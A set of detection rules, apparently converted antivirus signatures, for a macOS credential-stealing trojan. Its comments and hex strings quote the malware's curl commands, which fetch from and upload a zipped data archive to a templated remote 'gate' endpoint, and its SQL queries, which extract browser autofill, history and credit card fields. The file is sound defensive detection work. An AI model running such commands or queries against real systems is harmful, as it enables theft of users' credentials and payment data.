
rule Trojan_MacOS_Stealer_AMTB{
	meta:
		description = "Trojan:MacOS/Stealer!AMTB,SIGNATURE_TYPE_MACHOHSTR_EXT,06 00 06 00 03 00 00 "
		
	strings :
		$a_80_0 = {63 75 72 6c 20 2d 6b 20 2d 73 20 2d 48 20 22 61 70 69 2d 6b 65 79 3a 20 25 73 22 20 68 74 74 70 73 3a 2f 2f 25 73 2f 64 79 6e 61 6d 69 63 } //curl -k -s -H "api-key: %s" https://%s/dynamic  2
		$a_80_1 = {63 75 72 6c 20 2d 6b 20 2d 58 20 50 4f 53 54 20 2d 48 20 22 61 70 69 2d 6b 65 79 3a 20 25 73 22 20 2d 48 20 22 63 6c 3a 20 30 22 20 2d 2d 6d 61 78 2d 74 69 6d 65 20 33 30 30 20 2d 46 20 22 66 69 6c 65 3d 40 2f 74 6d 70 2f 6f 73 61 6c 6f 67 67 69 6e 67 2e 7a 69 70 22 20 2d 46 20 22 62 75 69 6c 64 74 78 64 3d 25 73 22 20 68 74 74 70 73 3a 2f 2f 25 73 2f 67 61 74 65 } //curl -k -X POST -H "api-key: %s" -H "cl: 0" --max-time 300 -F "file=@/tmp/osalogging.zip" -F "buildtxd=%s" https://%s/gate  2
		$a_80_2 = {35 31 39 30 65 66 31 37 33 33 31 38 33 61 30 64 63 36 33 66 62 36 32 33 33 35 37 66 35 36 64 36 } //5190ef1733183a0dc63fb623357f56d6  2
	condition:
		((#a_80_0  & 1)*2+(#a_80_1  & 1)*2+(#a_80_2  & 1)*2) >=6
 
}
rule Trojan_MacOS_Stealer_AMTB_2{
	meta:
		description = "Trojan:MacOS/Stealer!AMTB,SIGNATURE_TYPE_MACHOHSTR_EXT,05 00 05 00 05 00 00 "
		
	strings :
		$a_80_0 = {65 6e 63 72 79 70 74 65 64 5f 74 6f 6b 65 6e 73 65 72 76 69 63 65 2f 44 6f 63 75 6d 65 6e 74 73 2f 44 6f 77 6e 6c 6f 61 64 73 2f 64 61 74 61 2f 74 6d 70 63 63 61 53 45 4c 45 43 54 20 6e 61 6d 65 2c 20 76 61 6c 75 65 20 46 52 4f 4d 20 61 75 74 6f 66 69 6c 6c } //encrypted_tokenservice/Documents/Downloads/data/tmpccaSELECT name, value FROM autofill  1
		$a_80_1 = {2f 44 6f 63 75 6d 65 6e 74 73 2f 44 6f 77 6e 6c 6f 61 64 73 2f 64 61 74 61 2f 74 6d 70 63 68 68 53 45 4c 45 43 54 20 74 69 74 6c 65 2c 20 75 72 6c 2c 20 76 69 73 69 74 5f 63 6f 75 6e 74 20 46 52 4f 4d 20 75 72 6c 73 } ///Documents/Downloads/data/tmpchhSELECT title, url, visit_count FROM urls  1
		$a_80_2 = {74 69 74 6c 65 76 69 73 69 74 5f 63 6f 75 6e 74 2f 44 6f 63 75 6d 65 6e 74 73 2f 44 6f 77 6e 6c 6f 61 64 73 2f 64 61 74 61 2f 74 6d 70 63 63 53 45 4c 45 43 54 20 6e 61 6d 65 5f 6f 6e 5f 63 61 72 64 } //titlevisit_count/Documents/Downloads/data/tmpccSELECT name_on_card  1
		$a_80_3 = {63 61 72 64 5f 6e 75 6d 62 65 72 5f 65 6e 63 72 79 70 74 65 64 2c 20 65 78 70 69 72 61 74 69 6f 6e 5f 6d 6f 6e 74 68 2c 20 65 78 70 69 72 61 74 69 6f 6e 5f 79 65 61 72 20 46 52 4f 4d 20 63 72 65 64 69 74 5f 63 61 72 64 73 } //card_number_encrypted, expiration_month, expiration_year FROM credit_cards  1
		$a_80_4 = {6f 76 65 72 66 6c 6f 77 74 72 61 69 6c 65 72 73 70 61 73 73 77 6f 72 64 66 72 61 67 6d 65 6e 74 69 66 2d 6d 61 74 63 68 69 66 2d 72 61 6e 67 65 6c 6f 63 61 74 69 6f 6e } //overflowtrailerspasswordfragmentif-matchif-rangelocation  1
	condition:
		((#a_80_0  & 1)*1+(#a_80_1  & 1)*1+(#a_80_2  & 1)*1+(#a_80_3  & 1)*1+(#a_80_4  & 1)*1) >=5
 
}